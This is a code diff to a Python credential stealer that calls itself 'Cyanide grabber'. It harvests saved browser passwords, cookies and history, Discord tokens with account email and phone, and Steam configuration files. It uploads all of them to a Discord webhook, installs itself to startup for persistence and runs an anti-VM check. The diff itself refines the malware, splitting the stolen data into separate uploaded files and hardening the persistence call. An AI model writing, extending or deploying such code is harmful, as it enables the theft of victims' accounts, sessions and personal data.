@@ -30,7 +30,9 @@ class Main:
         return json.dumps(dataBuffer, indent=3)
 
     def browser(self):
-        creds = []
+        password_list = []
+        history_list = []
+        cookies_list = []
         for key in extractor.browsers_profile:
             browser = extractor.browsers_profile[key]
 
@@ -47,9 +49,10 @@ class Main:
                     history = extraction.extractHistory(os.path.join(browser, profile, "History"))
                     cookies = extraction.extractCookies(os.path.join(browser, profile))
 
-                    summary = {browser: {"Passwords": passwds, "History": history, "Cookies": cookies}}
-
-                    creds.append(summary)
+                    
+                    cookies_list.append(cookies)
+                    history_list.append(history)
+                    password_list.append(passwds)
 
         for key in extractor.browsers:
             browser = extractor.browsers[key]
@@ -60,11 +63,11 @@ class Main:
                 history = extraction.extractHistory(os.path.join(browser, "History"))
                 cookies = extraction.extractCookies(os.path.join(browser))
 
-                summary = {browser: {"Passwords": passwds, "History": history, "Cookies": cookies}}
-
-                creds.append(summary)
+                cookies_list.append(cookies)
+                history_list.append(history)
+                password_list.append(passwds)
         
-        return creds
+        return password_list, cookies_list, history_list
     
     def steam(self):
         steamUsersConf, steamConfigData = "None", "None"
@@ -101,24 +104,29 @@ class Main:
 
     def run(self):
         Thread(target=self.antivm).start()
-        self.addStartup("MyApp", os.path.abspath(os.path.dirname(__name__)))
+        
+        try:
+            self.addStartup("MyApp", os.path.abspath(os.path.dirname(__file__)))
+        except:
+            pass
         
         userConfig, steamConfig = self.steam()
-        listCreds = self.browser()
+        listPassword, listCookies, listHistory = self.browser()
         tokens = self.token()
 
         for token in tokens:
             userinfo = nukelib.account_info(token)
             
             # icon url not work
-            embed = DiscordEmbed(title=userinfo["username"], icon_url=f"https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Taurus.svg/1024px-Taurus.svg.png", color="656166")
+            embed = DiscordEmbed(title=userinfo["username"], color="656166")
             embed.add_embed_field(name='Token', value=token)
             embed.add_embed_field(name='Locale', value=userinfo["locale"])
             embed.add_embed_field(name='Email', value=userinfo["email"])
-            embed.add_embed_field(name='Phone', value=userinfo["phone"])
+            embed.add_embed_field(name='Phone', value=str(userinfo["phone"]))
             embed.add_embed_field(name='Verified', value=str(userinfo["verified"]))
             embed.set_footer(text='By Cyanide grabber')
 
+            embed.set_image(url=f"https://cdn.discordapp.com/avatars/{userinfo['id']}/{userinfo['avatar']}.png")
             embed.set_timestamp()
 
             self.webhook.add_embed(embed)
@@ -128,7 +136,9 @@ class Main:
         embed.set_footer(text='By Cyanide grabber')
         self.webhook.add_file(file=str(userConfig).encode(), filename="SteamUsersConfig.txt")
         self.webhook.add_file(file=str(steamConfig).encode(), filename="SteamConfig.txt")
-        self.webhook.add_file(file=self.credsIntodict(listCreds).encode(), filename="Passwords.History.Cookies.txt")
+        self.webhook.add_file(file=self.credsIntodict(listPassword).encode(), filename="Passwords.txt")
+        self.webhook.add_file(file=self.credsIntodict(listHistory).encode(), filename="History.txt")
+        self.webhook.add_file(file=self.credsIntodict(listCookies).encode(), filename="Cookies.txt")
         self.webhook.add_embed(embed)
         r = self.webhook.execute()
 
